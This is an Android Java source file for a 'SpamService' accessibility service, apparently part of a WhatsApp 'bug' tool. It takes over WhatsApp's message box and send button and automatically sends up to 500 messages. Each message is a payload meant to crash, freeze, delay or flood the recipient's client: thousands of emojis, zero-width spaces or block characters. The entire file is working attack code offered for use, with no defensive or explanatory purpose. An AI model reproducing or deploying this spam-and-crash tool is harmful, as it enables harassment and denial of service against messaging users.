package com.kaze.bugwa;

import android.accessibilityservice.AccessibilityService;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class SpamService extends AccessibilityService {
    private int count = 0;
    private boolean isSending = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!MainActivity.isRunning || count >= 500 || isSending) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
        if (pkg.equals("com.whatsapp")) {
            AccessibilityNodeInfo sendBtn = findNodeById(root, "com.whatsapp:id/send");
            AccessibilityNodeInfo inputBox = findNodeById(root, "com.whatsapp:id/entry");

            if (sendBtn != null && inputBox != null) {
                isSending = true;
                StringBuilder sb = new StringBuilder();

                if (MainActivity.bugType.equals("crash")) {
                    for (int i = 0; i < 3000; i++) sb.append("⚡");
                } else if (MainActivity.bugType.equals("delay")) {
                    for (int i = 0; i < 5000; i++) sb.append("\u200B");
                } else if (MainActivity.bugType.equals("freeze")) {
                    sb.append("FULL FREEZE INITIATED ");
                    for (int i = 0; i < 200; i++) sb.append("🔥");
                } else if (MainActivity.bugType.equals("quota")) {
                    sb.append("QUOTA EXHAUST: ");
                    for (int i = 0; i < 500; i++) sb.append("█");
                }

                inputBox.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, sb.toString());
                inputBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);

                sendBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                count++;

                int delay = MainActivity.bugType.equals("freeze") ? 300 : 800;
                new Handler(Looper.getMainLooper()).postDelayed(() -> isSending = false, delay);
            }
        }
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String id) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    @Override public void onInterrupt() {}
}
